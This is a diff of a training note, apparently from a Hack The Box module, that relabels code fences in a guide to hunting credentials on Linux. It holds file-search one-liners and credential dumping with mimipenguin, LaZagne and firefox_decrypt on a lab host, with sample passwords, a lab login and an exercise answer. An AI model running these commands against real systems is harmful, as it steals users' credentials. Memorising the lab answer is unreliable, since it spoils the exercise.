@@ -17,7 +17,7 @@ One core principle of Linux is that everything is a file. We should look for, fi
 
 ### Searching for configuration files
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
 
 File extension:  .conf
@@ -57,7 +57,7 @@ File extension:  .cnf
 
 Optionally, we can save the result in a text file and use it to examine the individual files one after the other. Another option is to run the scan directly for each file found with the specified file extension and output the contents. In this example, we search for three words (`user`, `password`, `pass`) in each file with the file extension `.cnf`.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
 
 File:  /snap/core18/2128/etc/ssl/openssl.cnf
@@ -88,7 +88,7 @@ File:  /etc/mysql/conf.d/mysql.cnf
   
 ### Searching for databases
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
 
 DB File extension:  .sql
@@ -131,7 +131,7 @@ DB File extension:  .db*
 ### Searching for notes
 Search for files including the `.txt` file extension and files that have no file extension at all.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
 
 /home/cry0l1t3/.config/caja/desktop-metadata
@@ -144,7 +144,7 @@ masterofblafu@htb[/htb]$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
 
 ### Searching for scripts
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
 
 File extension:  .py
@@ -177,7 +177,7 @@ File extension:  .sh
 ### Enumerating cronjobs
 Cron jobs are scheduled tasks that automatically run commands, programs, or scripts at specific times. These are divided into the system-wide area (/etc/crontab) and user-dependent executions. Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs. Furthermore, there are the areas that are divided into different time ranges (`/etc/cron.daily`, `/etc/cron.hourly`, `/etc/cron.monthly`, `/etc/cron.weekly`). The scripts and files used by cron can also be found in `/etc/cron.d/` for Debian-based distributions.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ cat /etc/crontab 
 
 # /etc/crontab: system-wide crontab
@@ -220,7 +220,7 @@ drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
 
 ### Enumerating history files
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ tail -n5 /home/*/.bash*
 
 ==> /home/cry0l1t3/.bash_history <==
@@ -301,7 +301,7 @@ fi
 
 Covering the analysis of these log files in detail would be inefficient in this case. So at this point, we should familiarize ourselves with the individual logs, first examining them manually and understanding their formats. However, here are some strings we can use to find interesting content in the logs:
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
 
 #### Log file:  /var/log/dpkg.log.1
@@ -319,7 +319,7 @@ masterofblafu@htb[/htb]$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "a
 ### Mimipenguin
 Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused. In order to retrieve this type of information from Linux distributions, there is a tool called [mimipenguin](https://github.com/huntergregal/mimipenguin) that makes the whole process easier. However, this tool requires administrator/root permissions.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo python3 mimipenguin.py
 
 [SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY
@@ -354,7 +354,7 @@ This tool allows us to access far more resources and extract the credentials. Th
 
 For example, **Keyrings** are used for secure storage and management of passwords on Linux distributions. Passwords are stored encrypted and protected with a master password. It is an OS-based password manager, which we will discuss later in another section. This way, we do not need to remember every single password and can save repeated password entries.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo python2.7 laZagne.py all
 
 |====================================================================|
@@ -391,14 +391,14 @@ Browsers store the passwords saved by the user in an encrypted form locally on t
 
 For example, when we store credentials for a web page in the Firefox browser, they are encrypted and stored in `logins.json` on the system. However, this does not mean that they are safe there. Many employees store such login data in their browser without suspecting that it can easily be decrypted and used against the company.
 
-```sh
+```shellsession
 [!bash]$ ls -l .mozilla/firefox/ | grep default 
 
 drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
 drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
 ```
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
 
 {
@@ -429,7 +429,7 @@ masterofblafu@htb[/htb]$ cat .mozilla/firefox/1bplpd86.default-release/logins.js
 
 The tool [Firefox Decrypt](https://github.com/unode/firefox_decrypt) is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, Firefox Decrypt 0.7.0 with Python 2 must be used.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ python3.9 firefox_decrypt.py
 
 Select the Mozilla profile you wish to decrypt
@@ -449,7 +449,7 @@ Password: 'FzXUxJemKm6g2lGh'
 
 Alternatively, **LaZagne** can also return results if the user has used the supported browser.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ python3 laZagne.py browsers
 
 |====================================================================|
@@ -484,7 +484,7 @@ SSH to 10.129.10.73 with user `kira` and password `L0vey0u1!`
 1. Examine the target and find out the password of the user Will. Then, submit the password as the answer. **Answer: TUqr7QfLTLhruhVbCP**
    - `$ ssh kira@10.129.10.73` → SSH to the target machine
    - Look for stored browser credentials:
-      ```sh
+      ```shellsession
       $ ls -l .mozilla/firefox/ | grep default 
       drwx------  2 kira kira 4096 Feb  9  2022 lktd9y8y.default
       drwx------ 10 kira kira 4096 Feb  9  2022 ytb95ytb.default-release
@@ -516,7 +516,7 @@ SSH to 10.129.10.73 with user `kira` and password `L0vey0u1!`
       ```
    - Install the [Firefox Decrypt](https://github.com/unode/firefox_decrypt) tool on the attack host and transfer it to the target machine:
    - Run the tool to decrypt the encrypted username and password:
-      ```sh
+      ```shellsession
       $ python3.9 firefox_decrypt.py 
       Select the Mozilla profile you wish to decrypt
       1 -> lktd9y8y.default
